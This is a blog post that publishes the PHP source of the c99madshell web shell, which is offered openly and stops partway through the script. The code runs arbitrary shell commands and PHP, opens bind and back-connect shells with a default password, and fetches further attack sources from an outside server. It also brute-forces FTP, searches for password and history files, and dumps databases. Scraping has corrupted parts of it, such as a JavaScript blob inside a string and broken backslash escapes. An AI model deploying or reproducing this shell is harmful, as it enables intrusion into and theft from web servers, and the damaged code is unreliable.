---
id: 219
title: c99madshell Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=219
permalink: /c99madshell-script/
categories:
  - C99
  - PHP
tags:
  - C99
  - PHP
---
This is the &#8216;2.0 madnet edition&#8217; of the [original c99 shell][1]


### c99madshell Source Code

{% highlight php %}<?php
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
$win = strtolower(substr(PHP_OS,0,3)) == "win";
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=&gt;$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_POST);
foreach($_REQUEST as $k=&gt;$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "2.0 madnet edition";
if (empty($surl))
{
 $surl = $_SERVER['PHP_SELF'];
}
$surl = htmlspecialchars($surl);

$timelimit = 0;
$host_allow = array("*");
$login_txt = "Admin area";
$accessdeniedmess = "&lt;a href=\"http://securityprobe.net\"&gt;c99madshell v.".$shver."&lt;/a&gt;: access denied";
$gzipencode = TRUE;
$c99sh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/"; //Sources-server
$filestealth = TRUE;
$donated_html = "&lt;center&gt;&lt;b&gt;Owned by root&lt;/b&gt;&lt;/center&gt;";
$donated_act = array("");
$curdir = "./";
$tmpdir = "";
$tmpdir_log = "./";

$log_email = "user@host.gov
/* &lt;![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]&gt; */
";
$sort_default = "0a";
$sort_save = TRUE;

$ftypes  = array(
 "html"=&gt;array("html","htm","shtml"),
 "txt"=&gt;array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=&gt;array("sh","install","bat","cmd"),
 "ini"=&gt;array("ini","inf"),
 "code"=&gt;array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=&gt;array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=&gt;array("sdb"),
 "phpsess"=&gt;array("sess"),
 "download"=&gt;array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);


$exeftypes  = array(
 getenv("PHPRC")." -q %f%" =&gt; array("php","php3","php4"),
 "perl %f%" =&gt; array("pl","cgi")
);

$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"&lt;font color=\"yellow\"&gt;","&lt;/font&gt;"),
  array("config.php",1) // example
);

$safemode_diskettes = array("a");
$hexdump_lines = 8;
$hexdump_rows = 24;
$nixpwdperpage = 100;
$bindport_pass = "c99mad";
$bindport_port = "31373";
$bc_port = "31373";
$datapipe_localport = "8081";
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}

$sess_cookie = "c99shvars";

$usefsbuff = TRUE;
$copy_unset = FALSE;

$quicklaunch = array(
 array("&lt;b&gt;&lt;hr&gt;HOME&lt;/b&gt;",$surl),
 array("&lt;b&gt;&lt;=&lt;/b&gt;","#\" onclick=\"history.back(1)"),
 array("&lt;b&gt;=&gt;&lt;/b&gt;","#\" onclick=\"history.go(1)"),
 array("&lt;b&gt;UPDIR&lt;/b&gt;","#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='%upd';document.todo.sort.value='%sort';document.todo.submit();"),
 array("&lt;b&gt;Search&lt;/b&gt;","#\" onclick=\"document.todo.act.value='search';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;Buffer&lt;/b&gt;","#\" onclick=\"document.todo.act.value='fsbuff';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;Tools&lt;/b&gt;","#\" onclick=\"document.todo.act.value='tools';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;Proc.&lt;/b&gt;","#\" onclick=\"document.todo.act.value='processes';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;FTP brute&lt;/b&gt;","#\" onclick=\"document.todo.act.value='ftpquickbrute';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;Sec.&lt;/b&gt;","#\" onclick=\"document.todo.act.value='security';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;SQL&lt;/b&gt;","#\" onclick=\"document.todo.act.value='sql';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;PHP-code&lt;/b&gt;","#\" onclick=\"document.todo.act.value='eval';document.todo.d.value='%d';document.todo.submit();"),
 array("&lt;b&gt;Self remove&lt;/b&gt;","#\" onclick=\"document.todo.act.value='selfremove';document.todo.submit();"),
 array("&lt;b&gt;Logout&lt;/b&gt;","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
);

$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);
/////////////////////////////////////
@set_time_limit(0);
$tmp = array();
foreach($host_allow as $k=&gt;$v) {$tmp[] = str_replace("\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("&lt;a href=\"http://securityprobe.net\"&gt;c99madshell&lt;/a&gt;: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 if (empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|&lt;br&gt;"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}

if (isset($_POST['act'])) $act  = $_POST['act'];
if (isset($_POST['d'])) $d    = urldecode($_POST['d']);
if (isset($_POST['sort'])) $sort = $_POST['sort'];
if (isset($_POST['f'])) $f    = $_POST['f'];
if (isset($_POST['ft'])) $ft   = $_POST['ft'];
if (isset($_POST['grep'])) $grep = $_POST['grep'];
if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];
if (isset($_POST['pid'])) $pid  = $_POST['pid'];
if (isset($_POST['sig'])) $sig  = $_POST['sig'];
if (isset($_POST['base64'])) $base64  = $_POST['base64'];
if (isset($_POST['fullhexdump'])) $fullhexdump  = $_POST['fullhexdump'];
if (isset($_POST['c'])) $c  = $_POST['c'];
if (isset($_POST['white'])) $white  = $_POST['white'];
if (isset($_POST['nixpasswd'])) $nixpasswd  = $_POST['nixpasswd'];

$lastdir = realpath(".");
chdir($curdir);
$sess_data = unserialize($_COOKIE["$sess_cookie"]);
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}

$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc))
{
 $disablefunc = str_replace(" ","",$disablefunc);
 $disablefunc = explode(",",$disablefunc);
}

if (!function_exists("c99_buff_prepare"))
{
function c99_buff_prepare()
{
 global $sess_data;
 global $act;
 foreach($sess_data["copy"] as $k=&gt;$v) {$sess_data["copy"][$k] = str_replace("\",DIRECTORY_SEPARATOR,realpath($v));}
 foreach($sess_data["cut"] as $k=&gt;$v) {$sess_data["cut"][$k] = str_replace("\",DIRECTORY_SEPARATOR,realpath($v));}
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
 if ($act != "copy") {foreach($sess_data["cut"] as $k=&gt;$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
 else {foreach($sess_data["copy"] as $k=&gt;$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
}
c99_buff_prepare();
if (!function_exists("c99_sess_put"))
{
function c99_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 c99_buff_prepare();
 $sess_data = $data;
 $data = serialize($data);
 setcookie($sess_cookie,$data);
}
}
foreach (array("sort","sql_sort") as $v)
{
 if (!empty($_POST[$v])) {$$v = $_POST[$v];}
}
if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) &gt; $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size &gt;= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size &gt;= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size &gt;= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return FALSE;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = TRUE;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return FALSE;}
 }
 else {return FALSE;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return FALSE;}
}
}
if (!function_exists("myshellexec"))
{
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("
",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

 return $type.join("",$owner).join("",$group).join("",$world);
}
}
if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) &gt; 0; $o["w"] = ($mode & 00200) &gt; 0; $o["x"] = ($mode & 00100) &gt; 0;
 $g["r"] = ($mode & 00040) &gt; 0; $g["w"] = ($mode & 00020) &gt; 0; $g["x"] = ($mode & 00010) &gt; 0;
 $w["r"] = ($mode & 00004) &gt; 0; $w["w"] = ($mode & 00002) &gt; 0; $w["x"] = ($mode & 00001) &gt; 0;
 return array("t"=&gt;$t,"o"=&gt;$o,"g"=&gt;$g,"w"=&gt;$w);
}
}
if (!function_exists("parsesort"))
{
function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}
}
if (!function_exists("view_perms_color"))
{
function view_perms_color($o)
{
 if (!is_readable($o)) {return "&lt;font color=red&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
 elseif (!is_writable($o)) {return "&lt;font color=white&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
 else {return "&lt;font color=green&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
}
}
if (!function_exists("c99getsource"))
{
function c99getsource($fn)
{
 global $c99sh_sourcesurl;
 $array = array(
  "c99sh_bindport.pl" =&gt; "c99sh_bindport_pl.txt",
  "c99sh_bindport.c" =&gt; "c99sh_bindport_c.txt",
  "c99sh_backconn.pl" =&gt; "c99sh_backconn_pl.txt",
  "c99sh_backconn.c" =&gt; "c99sh_backconn_c.txt",
  "c99sh_datapipe.pl" =&gt; "c99sh_datapipe_pl.txt",
  "c99sh_datapipe.c" =&gt; "c99sh_datapipe_c.txt",
 );
 $name = $array[$fn];
 if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}
 else {return FALSE;}
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (empty($file))
 {
  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $out = "# Dumped by C99madShell.SQL v. ".$shver."
# Home page: http://securityprobe.net
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
# Date: ".date("d.m.Y H:i:s")."
# DB: \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;
";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";

";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) &gt; 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);}
      $values = implode("', '", $values);
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');
";
      $out .= $sql;
     }
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------

";
 if ($file)
 {
  $fp = fopen($file, "w");
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=&gt;$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 $sql_query = urldecode($sql_query);
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "&lt;table border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=sql_query cols=100 rows=10&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=hidden name=submit value=\"1\"&gt;&lt;input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=submit name=sql_confirm value=\"Yes\"&gt;&nbsp;&lt;input type=submit value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;";
  if ($tbl_struct)
  {
   echo "&lt;td valign=\"top\"&gt;&lt;b&gt;Fields:&lt;/b&gt;&lt;br&gt;";
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo " &lt;a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"&gt;&lt;b&gt;".$name."&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
   echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
  }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
  "METHOD"=&gt;array(output_type),
  "METHOD1"...
  ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
  "SELECT"=&gt;array(3,1),
  "SHOW"=&gt;array(2,1),
  "DELETE"=&gt;array(1),
  "DROP"=&gt;array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
  $result["propertions"] = $types[$op];
  $result["query"]  = $query;
  if ($types[$op] == 2)
  {
   foreach($arr as $k=&gt;$v)
   {
    if (strtoupper($v) == "LIMIT")
    {
     $result["limit"] = $arr[$k+1];
     $result["limit"] = explode(",",$result["limit"]);
     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
     unset($arr[$k],$arr[$k+1]);
    }
   }
  }
 }
 else {return FALSE;}
}
}
if (!function_exists("c99fsearch"))
{
function c99fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== FALSE)
 {
  if($f != "." && $f != "..")
  {
   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
   if (is_dir($d.$f))
   {
    $search_i_d++;
    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
    if (!is_link($d.$f)) {c99fsearch($d.$f);}
   }
   else
   {
    $search_i_f++;
    if ($bool)
    {
     if (!empty($a["text"]))
     {
      $r = @file_get_contents($d.$f);
      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
      else {$bool = strpos(" ".$r,$a["text"],1);}
      if ($a["text_not"]) {$bool = !$bool;}
      if ($bool) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($h);
}
}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}
//Sending headers
@ob_start();
@ob_implicit_flush(0);
function onphpshutdown()
{
 global $gzipencode,$ft;
 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))
 {
  $v = @ob_get_contents();
  @ob_end_clean();
  @ob_start("ob_gzHandler");
  echo $v;
  @ob_end_flush();
 }
}
function c99shexit()
{
 onphpshutdown();
 exit;
}
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = TRUE;
 $hsafemode = "&lt;font color=red&gt;ON (secure)&lt;/font&gt;";
}
else {$safemode = FALSE; $hsafemode = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "&lt;font color=red&gt;".$v."&lt;/font&gt;";}
else {$openbasedir = FALSE; $hopenbasedir = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";}
$sort = htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
